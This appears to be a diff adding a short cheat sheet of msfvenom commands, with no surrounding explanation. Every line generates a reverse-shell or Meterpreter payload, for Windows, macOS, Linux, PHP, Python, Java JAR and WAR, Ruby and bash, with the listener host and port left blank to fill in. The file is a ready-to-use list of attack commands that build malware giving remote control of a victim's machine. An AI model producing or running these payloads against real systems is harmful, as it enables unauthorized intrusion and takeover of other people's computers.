@@ -1,0 +1,10 @@
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o exe.exe
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > macho.macho
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > elf.elf
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -e php/base64 -f raw -o php.php
+msfvenom --platform python -p python/meterpreter/reverse_https LHOST= LPORT= -o py.py
+msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST= LPORT= -o jar.jar
+msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST= LPORT= > war.war
+msfvenom --platform ruby -p ruby/shell_reverse_tcp LHOST= LPORT= -o rb.rb
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh       
